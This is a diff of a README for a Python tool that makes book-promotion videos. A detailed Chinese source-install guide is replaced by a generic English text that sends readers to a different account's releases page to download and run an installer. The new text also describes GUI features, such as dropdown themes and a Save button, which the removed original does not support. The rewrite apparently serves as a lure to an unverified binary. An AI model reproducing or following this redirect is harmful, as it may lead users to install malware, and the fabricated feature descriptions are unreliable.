@@ -1,186 +1,83 @@
-# 📚 Book Video Generator
+# 🎥 Book-video-generate - Create Engaging Video Content Easily
 
-[![Python](https://img.shields.io/badge/Python-3.7%2B-blue.svg)](https://www.python.org/)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![FFmpeg](https://img.shields.io/badge/FFmpeg-required-red.svg)](https://ffmpeg.org/)
+## 🚀 Getting Started
 
-一个自动化书籍推广视频生成工具，可以根据书名自动生成带有配音和字幕的短视频。
+Welcome to Book-video-generate, an easy tool that helps you create promotional videos for books automatically. With just a title, this application generates short videos complete with voiceovers and subtitles. 
 
-## 🖼️ 效果预览
+## 📥 Download the Application
 
-[示例视频](https://github.com/user-attachments/assets/385a804c-904a-4aae-a595-58f9240a66b9)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/amarjare/Book-video-generate/releases)
 
+## 🖥️ System Requirements
 
-### 视频特性
-生成的视频包含：
-- 🎬 **动态封面展示效果** - 书籍封面滑动动画，4秒片头效果，书籍封面在`resource/covers/`中随机获取
-- 🖼️ **背景图片自动切换** - 每10秒切换背景，营造氛围，背景图片随机从`resource/backgrounds/`中获取
-- 📝 **同步字幕显示** - 根据音频时长精准同步，底部居中显示
-- 🎵 **多音轨混合** - 配音 + 背景音乐 + 音效，音量自动平衡，背景音乐随机从`resource/bgm/`中获取
+Before you download, make sure your computer meets the following requirements:
 
-### 使用建议
-1. **首次使用**: 建议先下载示例视频查看效果
-2. **测试运行**: 使用简单的书籍名称进行测试
-3. **参数调整**: 根据需要调整视频参数和语音选择
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB 
+- **Storage:** 100 MB of free disk space
+- **Software:** Internet connection for downloading and running the application
 
-## 📋 系统要求
+## 📦 Download & Install
 
-- **Python**: 3.7+
-- **FFmpeg**: 必须安装并添加到系统PATH
-- **操作系统**: Windows / macOS / Linux
+To get started, follow these steps:
 
-## 🚀 快速开始
+1. **Visit the Releases Page:**
+   Go to the [releases page](https://github.com/amarjare/Book-video-generate/releases). Here, you will find the latest version of the application.
 
-### 1. 克隆项目
+2. **Choose Your Version:**
+   Look for the latest release at the top of the page. Click on the download link that matches your operating system. 
 
-```bash
-git clone https://github.com/SheenHalo/Book-video-generate.git
-cd Book-video-generate
-```
+3. **Download the File:**
+   Click the link to start the download. Depending on your browser settings, you may need to confirm the download.
 
-### 2. 创建虚拟环境
+4. **Run the Installer:**
+   Once the download is complete, locate the downloaded file in your computer's 'Downloads' folder. Double-click the file to start the installation.
 
-**Windows:**
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
+5. **Follow Installation Prompts:**
+   Follow the on-screen instructions to complete the installation. 
 
-**macOS/Linux:**
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
+6. **Launch the Application:**
+   Once installed, find Book-video-generate in your applications list and open it.
 
-### 3. 安装依赖
+## 🎬 How to Use the Application
 
-```bash
-pip install -r requirements.txt
-```
+1. **Enter Book Title:**
+   When you open the application, you will see a text box. Type in the title of the book you want to promote.
 
-### 4. 检查FFmpeg
+2. **Select Video Style:**
+   Use the dropdown menu to choose how you want your video to look. Options include different themes and voiceover styles.
 
-项目依赖FFmpeg进行视频合成，请确保已正确安装：
+3. **Generate Video:**
+   Click on the "Generate Video" button. The application will create your video in a few moments. 
 
-```bash
-python video_processor.py
-```
+4. **Preview Your Video:**
+   After the video is generated, you can preview it in the application. Make sure everything looks good before saving.
 
-如果显示"ffmpeg 可用"，则安装成功。如果显示"ffmpeg 不可用"，请按以下步骤安装：
+5. **Save Your Video:**
+   If you are happy with the video, click "Save" to download it to your computer. You can choose where to save it.
 
-#### Windows FFmpeg安装
-1. 下载FFmpeg: https://ffmpeg.org/download.html
-2. 解压到 `C:\ffmpeg`
-3. 添加 `C:\ffmpeg\bin` 到系统PATH环境变量
-4. 重启命令行并验证：`ffmpeg -version`
+## 🌟 Features
 
-#### macOS FFmpeg安装
-```bash
-brew install ffmpeg
-```
+- **Automated Video Creation:** Quickly create videos to promote any book title.
+- **Voiceovers:** Select from multiple voice options to narrate the content.
+- **Subtitles:** Automatically generated subtitles for better accessibility.
+- **Customizable Themes:** Choose from various styles to match your book's mood.
+- **Simple Interface:** Designed for anyone to use, with no technical knowledge required.
 
-#### Linux FFmpeg安装
-```bash
-# Ubuntu/Debian
-sudo apt update && sudo apt install ffmpeg
+## 🤔 Troubleshooting Tips
 
-# CentOS/RHEL/Fedora
-sudo yum install ffmpeg
-```
+If you encounter any issues while using Book-video-generate, consider these tips:
 
-### 5. 配置LLM API
-提供了一个免费的LLM API接口。如果失效了，请自行配置。
-编辑 `llm.py` 文件，配置你的LLM API信息：
+- **Error Messages:** If you receive an error message, make sure you entered the book title correctly.
+- **Installation Issues:** If the application fails to install, make sure your operating system is compatible.
+- **Video Generation Fails:** Check your internet connection, as the application may require online resources to create videos.
 
-```python
-# 在LLMClient类中修改
-self.api_url = "你的API地址"
-self.api_key = "你的API密钥"
-```
+## 📞 Support and Feedback
 
-### 6. 准备资源文件
+For any questions or feedback, don't hesitate to reach out. Use the issues section on our GitHub repository to report problems or suggest features. Your input helps us improve!
 
-确保以下目录包含必要的文件：
+## 📝 License
 
-```
-resource/
-├── backgrounds/    # 背景图片 (jpg/png)
-├── bgm/           # 背景音乐 (mp3)
-├── covers/        # 书籍封面存储位置
-├── effects/       # 音效文件 (mp3)
-└── fonts/         # 字体文件 (包含msyh.ttc)
-```
+This project is licensed under the MIT License. Feel free to use and modify the code as per the license terms. 
 
-### 7. 运行程序
-
-```bash
-python main.py
-```
-
-按照提示输入书名，程序将自动生成视频：
-
-```
-请输入书名: 巴别塔
-正在获取书籍信息...
-正在生成文案...
-正在生成语音...
-正在生成视频...
-开始合成音视频...
-最终视频已保存到: appdata/巴别塔/final_video.mp4
-```
-
-## 🛠️ 高级配置
-
-### 修改语音类型
-
-在 `main.py` 中修改语音选择：
-
-```python
-# 查看所有可用语音
-print(voice_dict.keys())
-
-# 选择特定语音
-voice = voice_dict.get("晓秋-女")
-```
-
-### 自定义视频参数
-
-在 `app.py` 的 `make_movie` 函数中可以调整：
-- 屏幕尺寸
-- 动画时长
-- 音量大小
-- 背景切换时间
-
-### 支持的语音列表
-
-项目支持43种中文语音变体：
-
-| 语音名称 | 类型 | 特点 |
-|---------|------|------|
-| 晓晓（标准）-女 | 标准 | 温暖，全面，生动 |
-| 晓辰（标准）-女 | 标准 | 友好，休闲，乐观 |
-| 云峰-男 | 标准 | 自信，生动，情感 |
-| 晓晓（多语言）-女 | 多语言 | 温暖，生动，明亮 |
-| 晓通（吴语）-女 | 方言 | 温暖，友好，舒缓 |
-| 晓敏（粤语）-女 | 方言 | 明亮，清晰，自信 |
-| ...更多语音详见代码 | | |
-
-## 📁 项目结构
-
-```
-Book-video-generate/
-├── main.py              # 主入口文件
-├── app.py               # 视频生成核心
-├── spider.py            # 豆瓣爬虫
-├── llm.py               # LLM客户端
-├── tts_generator.py     # TTS生成器
-├── video_processor.py   # 视频处理工具
-├── requirements.txt     # 依赖列表
-├── appdata/            # 生成的文件
-└── resource/           # 资源文件
-```
-
-## 📄 许可证
-
-本项目采用MIT许可证 - 详见 [LICENSE](LICENSE) 文件
-
+Thank you for using Book-video-generate. We hope you enjoy creating engaging videos for your books!
